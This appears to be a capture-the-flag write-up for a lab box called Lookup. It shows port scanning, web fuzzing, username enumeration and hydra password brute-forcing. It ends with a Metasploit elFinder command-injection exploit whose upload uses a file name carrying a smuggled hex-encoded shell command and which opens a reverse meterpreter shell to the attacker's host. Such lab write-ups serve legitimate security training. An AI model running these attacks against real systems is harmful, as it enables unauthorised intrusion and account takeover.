# **Lookup CTF**

nmap

```
➤ nmap -A 10.65.175.16
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 22:55 -05
Nmap scan report for lookup.thm (10.65.175.16)
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 35:00:cb:e7:aa:f5:e7:c1:63:b7:ed:2a:14:0d:7f:cc (RSA)
|   256 4a:6d:83:83:e5:b8:d8:e1:84:59:7f:13:b0:c3:e3:4e (ECDSA)
|_  256 df:b2:ff:47:1a:30:4f:d1:f4:dc:02:1c:73:88:09:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
```

ffuf dir

```
➤ ./ffuf -w /home/sebastian/utils/SecLists/Discovery/Web-Content/raft-large-directories.txt:FUZZ  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0" -u http://lookup.thm/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lookup.thm/FUZZ
 :: Wordlist         : FUZZ: /home/sebastian/utils/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 72ms]
:: Progress: [62281/62281] :: Job [1/1] :: 555 req/sec :: Duration: [0:01:56] :: Errors: 0 ::
```

ffuf files

```
➤ ./ffuf -w /home/sebastian/utils/SecLists/Discovery/Web-Content/raft-large-files.txt:FUZZ  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0" -u http://lookup.thm/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lookup.thm/FUZZ
 :: Wordlist         : FUZZ: /home/sebastian/utils/SecLists/Discovery/Web-Content/raft-large-files.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 76ms]
login.php               [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 76ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 72ms]
.                       [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 73ms]
styles.css              [Status: 200, Size: 687, Words: 95, Lines: 51, Duration: 73ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 73ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 71ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 71ms]
.htm                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 74ms]
.htpasswds              [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 73ms]
.htgroup                [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 139ms]
wp-forum.phps           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 72ms]
.htaccess.bak           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 73ms]
.htuser                 [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 71ms]
.ht                     [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 72ms]
.htc                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 72ms]
.htaccess.old           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 71ms]
.htacess                [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 72ms]
:: Progress: [37050/37050] :: Job [1/1] :: 555 req/sec :: Duration: [0:01:08] :: Errors: 0 ::
```

ffuf subdomains

```
➤ ./ffuf -w /home/sebastian/utils/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0" -H "Host: FUZZ.lookup.thm" -fs 0 -u http://lookup.thm/

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lookup.thm/
 :: Wordlist         : FUZZ: /home/sebastian/utils/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.lookup.thm
 :: Header           : User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 73ms]
:: Progress: [114442/114442] :: Job [1/1] :: 561 req/sec :: Duration: [0:03:32] :: Errors: 0 ::
```

There is a clue when you login, if you login with admin:

```
Wrong password. Please try again.
Redirecting in 3 seconds.
```

If you login with random letters:

```
Wrong username or password. Please try again.
Redirecting in 3 seconds.
```

So I hydra’d the users to see if we got another valid user:

```
➤ hydra -p aaa -L /home/sebastian/utils/SecLists/Usernames/Names/names.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-31 23:21:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10713 login tries (l:10713/p:1), ~670 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:username
[80][http-post-form] host: lookup.thm   login: admin   password: aaa
[STATUS] 1897.00 tries/min, 1897 tries in 00:01h, 8816 to do in 00:05h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: aaa
[STATUS] 1919.33 tries/min, 5758 tries in 00:03h, 4955 to do in 00:03h, 16 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-31 23:26:49
```

And now hydra user jose:

```
➤ hydra -l jose -P /home/sebastian/utils/SecLists/Passwords/Leaked-Databases/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-31 23:34:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong
[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-31 23:35:19
```

After logging in with jose, we see that we are running elFinder

```
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > options

Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported p
                                         roxies: http, sapni, socks4, socks5, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                         /basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /elFinder/       yes       The base path to elFinder
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.6      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Auto

View the full module info with the info, or info -d command.

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm
RHOSTS => files.lookup.thm
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST 192.168.135.251
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set verbose true
verbose => true
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > check
[*] 10.65.175.16:80 - The service is running, but could not be validated.
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
[*] Started reverse TCP handler on 192.168.135.251:4444
[*] Uploading payload 'VDSFdfV2b.jpg;echo 6370202e2e2f66696c65732f5644534664665632622e6a70672a6563686f2a202e6b636f385257482e706870 |xxd -r -p |sh& #.jpg' (1937 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.kco8RWH.php) ...
[*] Sending stage (42137 bytes) to 10.65.175.16
[+] Deleted .kco8RWH.php
[*] Meterpreter session 1 opened (192.168.135.251:4444 -> 10.65.175.16:35410) at 2026-02-01 00:11:55 -0500
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter >
```
